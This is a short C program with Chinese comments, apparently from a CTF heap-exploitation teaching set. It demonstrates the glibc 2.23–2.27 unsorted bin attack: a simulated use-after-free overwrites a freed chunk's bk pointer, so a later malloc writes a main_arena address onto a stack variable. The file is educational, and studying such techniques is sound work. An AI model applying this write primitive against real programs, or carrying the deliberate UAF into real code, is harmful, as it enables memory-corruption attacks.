/*
 * 中文导读（CTF 版）
 *
 * 手法：unsorted_bin_attack
 * 文件标注范围：2.23 ~ 2.27
 * 模拟漏洞：UAF 改写 unsorted chunk 的 bk。2.26/2.27 已有 tcache，所以
 * victim 使用 request=0x410（物理 size=0x420），保证直接进入 unsorted。
 * 核心流程：从 unsorted 摘链时执行 bck->fd = unsorted_chunks(av)，把 main_arena 地址写到 target。
 * 成功判据：target 由 0 变为非零的 main_arena 指针；2.28 的 bck->fd 一致性检查已封堵此经典形式。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。所有故意的 UAF、越界和 double free 都是漏洞模拟，不是正常 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时应按实际 libc 源码判断。
 */

#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main(){

	unsigned long stack_var=0;

	unsigned long *p=malloc(0x410);

	malloc(500);

	free(p);

	// ---------------- 漏洞模拟开始：覆盖 unsorted victim 的 bk 指针。 ----------------

	p[1]=(unsigned long)(&stack_var-2);

	//------------------------------------

	malloc(0x410);

	assert(stack_var != 0);
	fprintf(stderr, "[+] unsorted：目标写成功\n");
}
